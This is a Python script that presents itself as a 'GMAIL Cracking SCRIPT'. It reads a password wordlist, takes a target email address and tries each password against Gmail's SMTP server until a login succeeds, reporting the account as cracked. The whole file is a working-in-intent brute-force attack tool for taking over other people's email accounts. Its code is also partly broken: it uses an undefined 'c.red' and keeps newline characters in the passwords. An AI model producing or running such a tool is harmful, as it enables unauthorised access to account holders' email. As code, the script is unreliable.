import smtplib
import sys
from os import system as os
from time import sleep as ti

os("clear")

class start:
   n_1 = "=================================================\n"
   n_2 = "GMAIL Cracking SCRIPT\tby\n† : Anonymorzz:Kruz †\nAnonymorzz@gmail.com\n"


for char in '\033[4m' + start.n_1 + "\n" + '\033[92m' + start.n_2: # red , green
    sys.stdout.write(char)
    sys.stdout.flush()
    ti(0.02)

def lolo():
    print("\n[1] START ©racking")
    print("[2] EXIT ©0DE")
lolo()

nn_1 = '\033[91m' + "Enter::"   # red
for tins in nn_1:
    sys.stdout.write(tins)
    sys.stdout.flush()
    ti(0.1)
choose = int(input(" "))

if choose == 1:
    nn_2 = "\tPATH TO passwords file"
    for tins in nn_2:
        sys.stdout.write(tins)
        sys.stdout.flush()
        ti(0.05)
    file_path = input(":: ")
else:
   os("clear")
   print("EXITING D SCRIPT")
   exit()
pass_file = open(file_path,"r")
pass_list = pass_file.readlines()
for oo in pass_list:
    print(oo)
def login():
    i = 0
    nn_3 = "\tENTER D EMAIL NANE"
    for tins in nn_3:
        sys.stdout.write(tins)
        sys.stdout.flush()
        ti(0.06)
    user_name = input(":: ")
    server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
    server.ehlo()
    for password in pass_list:
      i = i + 1
      print(str(i) + "/" + str(len(pass_list)))
      try:
         ti(0.01)
         server.login(user_name, password)
         for char in start.n_2 + c.red:
             sys.stdout.write(char)
             sys.stdout.flush()
             ti(0.01)
         print("\n")
         print("[+] Here is  Password :" + password)
         break
      except smtplib.SMTPAuthenticationError as e:
         error = str(e)
         if error[14] == "<":
            os("clear")
            print('\033[92m' + "ACCOUNT CRACKED")
            print("[+] This account has been cracked, password :" + password) # green
            break
         else:
            print('\033[91m' + "[!] password not found => " + password) # red
login()
